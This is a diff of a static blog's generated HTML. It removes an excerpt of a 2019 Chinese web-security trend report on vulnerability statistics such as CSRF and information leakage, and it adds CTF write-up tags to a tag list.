-<p>上半年攻击趋势如下：<br><img src="https://www.secpulse.com/wp-content/uploads/2019/08/%E5%9B%BE%E7%89%8718.png" alt=""><br>主要网站攻击类型统计分布：<br><img src="https://www.secpulse.com/wp-content/uploads/2019/08/%E5%9B%BE%E7%89%8719.png" alt=""></p>
-<h2><span id="网站漏洞类型以webapp漏洞和web服务器漏洞为主">网站漏洞类型以Webapp漏洞和Web服务器漏洞为主</span></h2><p>通过深信服网站安全监测平台的数据分析，对国内上半年已授权的网站进行漏洞监控，2019年上半年收集的漏洞2522个，漏洞类别占比前三的分别是WebApp漏洞、Web服务器漏洞和Web_Activex漏洞。详细高危漏洞类型分布如下：<br><img src="https://www.secpulse.com/wp-content/uploads/2019/08/add.png" alt=""></p>
-<h2><span id="用户关注度较高的漏洞">用户关注度较高的漏洞</span></h2><p>根据用户查阅CNVD漏洞信息次数的统计结果，上半年用户关注度最高的5个漏洞如表所示。<br><img src="https://www.secpulse.com/wp-content/uploads/2019/08/%E5%9B%BE%E7%89%8727.png" alt=""></p>
-<h2><span id="高危漏洞类型以csrf跨站请求伪造为主">高危漏洞类型以CSRF跨站请求伪造为主</span></h2><p>深信服网站安全监测平台对国内上半年已授权的7087个站点进行漏洞监控，发现高危站点7689个，高危漏洞72308个，漏洞类别占比前三的分别是CSRF跨站请求伪造、信息泄漏和点击劫持。详细高危漏洞类型分布如下：<br><img src="https://www.secpulse.com/wp-content/uploads/2019/08/%E5%9B%BE%E7%89%8728.png" alt=""><br>具体比例如下：<br><img src="https://www.secpulse.com/wp-content/uploads/2019/08/%E5%9B%BE%E7%89%8729.png" alt=""></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/08/08/2019安全态势/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
@@ -1066,11 +1041,23 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">WriteUp,PHP</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">WriteUP</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">XCTF WriteUP</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">web php</a>
+                <a href="javascript:void(0)" class="js-tag color3">web,php</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">wp</a>
               </li>
             
             <div class="clearfix"></div>
